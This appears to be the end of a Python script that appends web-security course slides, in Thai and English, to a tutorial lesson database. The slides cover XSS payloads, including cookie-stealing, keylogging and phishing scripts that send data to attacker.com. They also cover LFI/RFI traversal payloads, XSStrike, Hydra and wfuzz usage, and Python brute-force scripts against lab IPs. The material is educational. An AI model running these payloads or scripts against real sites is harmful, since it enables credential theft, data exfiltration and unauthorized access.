<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.75rem;">&lt;iframe src="javascript:alert('XSS')"&gt;&lt;/iframe&gt;</td><td style="padding:8px 14px; color:#94a3b8;">XSS in iframe</td></tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.75rem;">&lt;body onload=alert('XSS')&gt;</td><td style="padding:8px 14px; color:#94a3b8;">Triggers on page load</td></tr>
<tr><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.75rem;">&lt;a href="javascript:alert('XSS')"&gt;Click me&lt;/a&gt;</td><td style="padding:8px 14px; color:#94a3b8;">XSS via href</td></tr>
</tbody>
</table>
</div>

#### 💥 XSS Attack Examples
```javascript
// Steal Cookies
<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie;</script>

// Keylogging Attack
<script>
document.onkeypress = function(e) {
    fetch('http://attacker.com/log.php?key=' + e.key);
};
</script>
```

```javascript
// Fake Login Page (Phishing)
<script>
document.body.innerHTML='<form action="http://attacker.com" method="POST"><input name="username"><input name="password"><input type="submit"></form>';
</script>
```

#### 🛠️ XSStrike — Advanced XSS Scanner
**XSStrike** คือ scanner ขั้นสูงที่ fuzzes, detects และ exploits ช่องโหว่ XSS โดยสร้าง payload พิเศษตาม response ของเว็บ
```bash
# Installing XSStrike
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike && pip3 install -r requirements.txt

# Scan a URL for XSS
python3 xsstrike.py -u "http://target.com/search.php?q=test"

# Automated XSS Scanning
python3 xsstrike.py --auto -u "http://target.com/search.php?q=test"

# Enable WAF Bypass Mode
python3 xsstrike.py -u "http://target.com/search.php?q=" --fuzz
```

---

### 📄 SLIDE 126-135: File Inclusion Attacks (LFI/RFI) — การโจมตีรวมไฟล์

**File Inclusion Attack** เกิดขึ้นเมื่อผู้โจมตีสามารถรวมไฟล์ (local หรือ remote) เข้าในเว็บแอปพลิเคชัน เนื่องจากการตรวจสอบ input ไม่เพียงพอ

- **Local File Inclusion (LFI)** — โจมตีด้วยการรวมไฟล์จาก server ท้องถิ่น
- **Remote File Inclusion (RFI)** — โจมตีด้วยการรวมไฟล์จาก server ระยะไกล

```php
// LFI Example (Vulnerable PHP)
<?php include($_GET['page']); ?>
// ถ้าโจมตีด้วย: page=../../../../etc/passwd → อ่านไฟล์รายชื่อผู้ใช้

// RFI Example (Vulnerable PHP)
<?php include($_GET['file']); ?>
// ถ้าโจมตีด้วย: file=http://attacker.com/malicious_file → รันโค้ดจากระยะไกล
```

```bash
# LFI Attacks
http://example.com/getFile?name=../../../etc/passwd
http://target.com/index.php?page=../../../../../../../var/log/apache2/access.log

# RFI Attack
http://target.com/index.php?page=http://attacker.com/malicious_file.php

# Exploit Using cURL
curl -X POST -d "name=../../../etc/passwd" http://example.com/getFile
```

#### 📋 File Inclusion Payloads

<div style="background:#070a13; border:1px solid rgba(255,255,255,0.06); border-radius:8px; overflow:hidden; margin:1rem 0;">
<table style="width:100%; border-collapse:collapse; font-size:0.78rem;">
<thead>
<tr style="background:rgba(0,240,255,0.08); border-bottom:1px solid rgba(0,240,255,0.15);">
<th style="padding:10px 14px; text-align:left; color:#00f0ff; font-weight:700;">Type</th>
<th style="padding:10px 14px; text-align:left; color:#00f0ff; font-weight:700;">Example Payload</th>
<th style="padding:10px 14px; text-align:left; color:#00f0ff; font-weight:700;">Description</th>
</tr>
</thead>
<tbody>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:8px 14px; color:#fbbf24; font-weight:600;">LFI</td><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.75rem;">../../../../etc/passwd</td><td style="padding:8px 14px; color:#94a3b8;">Access system files (Linux)</td></tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:8px 14px; color:#fbbf24; font-weight:600;">LFI</td><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.75rem;">../../../../../../../boot.ini</td><td style="padding:8px 14px; color:#94a3b8;">Access system files (Windows)</td></tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:8px 14px; color:#fbbf24; font-weight:600;">LFI</td><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.75rem;">php://input</td><td style="padding:8px 14px; color:#94a3b8;">Access PHP input streams</td></tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:8px 14px; color:#fbbf24; font-weight:600;">LFI</td><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.75rem;">../../../var/www/html/index.php</td><td style="padding:8px 14px; color:#94a3b8;">Read source code of index.php</td></tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:8px 14px; color:#fbbf24; font-weight:600;">LFI</td><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.75rem;">....//....//....//windows/system.ini</td><td style="padding:8px 14px; color:#94a3b8;">Alternative traversal pattern</td></tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:8px 14px; color:#fbbf24; font-weight:600;">LFI</td><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.75rem;">..\\..\\..\\..\\.\\windows\\win.ini</td><td style="padding:8px 14px; color:#94a3b8;">Windows backslash traversal</td></tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:8px 14px; color:#fbbf24; font-weight:600;">LFI</td><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.75rem;">%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd</td><td style="padding:8px 14px; color:#94a3b8;">URL-encoded traversal (../ encoded)</td></tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:8px 14px; color:#fbbf24; font-weight:600;">LFI</td><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.75rem;">php://filter/convert.base64-encode/resource=index.php</td><td style="padding:8px 14px; color:#94a3b8;">Bypass restrictions by encoding content in base64</td></tr>
<tr><td style="padding:8px 14px; color:#ef4444; font-weight:600;">RFI</td><td style="padding:8px 14px; color:#ff007f; font-family:monospace; font-size:0.75rem;">http://attacker.com/mal_file.txt</td><td style="padding:8px 14px; color:#94a3b8;">Include and execute a remote malicious file</td></tr>
</tbody>
</table>
</div>

---

### 📄 SLIDE 136-150: Brute Force Attacks — การโจมตีแบบลองทุกรหัสผ่าน

**Brute Force Attack** คือการ trial-and-error เพื่อเดา password, encryption key หรือ credential โดยการลองทุก combination อย่างเป็นระบบ

<div style="background:#070a13; border:1px solid rgba(255,255,255,0.06); border-radius:8px; overflow:hidden; margin:1rem 0;">
<table style="width:100%; border-collapse:collapse; font-size:0.78rem;">
<thead>
<tr style="background:rgba(0,240,255,0.08); border-bottom:1px solid rgba(0,240,255,0.15);">
<th style="padding:10px 14px; text-align:left; color:#00f0ff; font-weight:700;">Attack Type</th>
<th style="padding:10px 14px; text-align:left; color:#00f0ff; font-weight:700;">Description</th>
</tr>
</thead>
<tbody>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:8px 14px; color:#fbbf24; font-weight:600;">Simple Brute Force</td><td style="padding:8px 14px; color:#94a3b8;">Tries every possible combination of characters</td></tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:8px 14px; color:#fbbf24; font-weight:600;">Dictionary Attack</td><td style="padding:8px 14px; color:#94a3b8;">Uses a predefined list of common passwords</td></tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:8px 14px; color:#fbbf24; font-weight:600;">Hybrid Attack</td><td style="padding:8px 14px; color:#94a3b8;">Combines dictionary words with numbers or symbols</td></tr>
<tr style="border-bottom:1px solid rgba(255,255,255,0.04);"><td style="padding:8px 14px; color:#fbbf24; font-weight:600;">Credential Stuffing</td><td style="padding:8px 14px; color:#94a3b8;">Uses leaked username-password pairs</td></tr>
<tr><td style="padding:8px 14px; color:#fbbf24; font-weight:600;">Reverse Brute Force</td><td style="padding:8px 14px; color:#94a3b8;">Uses a common password (e.g., "password123") against multiple usernames</td></tr>
</tbody>
</table>
</div>

#### 🔨 Brute Force Tools: Hydra
```bash
# GET request method
hydra -l admin -P /path/to/passwords.txt http-get://target.com/login.php

# POST request method
hydra -l admin -P /path/to/passwords.txt http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid login"
```
- `-l admin` → Username to attack
- `-P /path/to/passwords.txt` → Password list file
- `http-get://` → Protocol for GET request method
- `login.php` → URL of the login page

#### 🔨 Brute Force Tools: WFUZZ
```bash
wfuzz -c -z file,/path/to/passwords.txt --hc 404 http://target.com/login.php?username=admin&password=FUZZ
```
- `-z file,/path/to/passwords.txt` → Use passwords from the specified list
- `--hc 404` → Ignore responses with HTTP 404
- `FUZZ` is the place where the passwords will be substituted

#### 🐍 Python Script for Web Brute Force (GET request)
```python
import requests

# Brute force room numbers
for i in range(1000, 9000):
    url = 'http://172.19.19.129:8000/dakw/'
    web = requests.get(url + 'room' + str(i) + '.html')
    if 'Not Found' not in web.text:
        print(url + 'room' + str(i) + '.html')

# Brute force page numbers (zero-padded)
for i in range(6, 500):
    link = 'http://172.19.19.129:8003/page/' + str(i).zfill(5)
    web = requests.get(link)
    if web.text.find('404 Not Found') == -1:
        print(link)
```

#### 🐍 Python Script for Web Brute Force (POST request)
```python
import requests

# POST brute force - find first valid page
for i in range(501, 10000):
    link = 'http://172.19.19.129:8003/new/'
    s = 'Test' + str(i).zfill(5)
    requests.post(link, {'title': s, 'message': s})
    link_page = 'http://172.19.19.129:8003/page/' + str(i).zfill(5)
    web = requests.get(link_page)
    if web.text.find('404 Not Found') >= 0:
        print(link)
        break

# 3-digit PIN brute force
import requests

def loop():
    for a in range(10):
        for b in range(10):
            for c in range(10):
                web = requests.post('http://172.19.19.129:8000/ecxb/index.php',
                    {'digit1': a, 'digit2': b, 'digit3': c})
                print(str(a) + str(b) + str(c))
                if 'Unlucky Lottery' not in web.text:
                    return
loop()
```
"""

with app.app_context():
    l = TutorialLesson.query.get(178)
    if l:
        blocks = json.loads(l.content)
        blocks[0]['value'] += new_content
        l.content = json.dumps(blocks, ensure_ascii=False)
        app.db.session.commit()
        print(f"Successfully appended content to Lesson 178 Block 0!")
        print(f"New Block 0 length: {len(blocks[0]['value'])} characters")
    else:
        print("ERROR: Lesson 178 not found!")
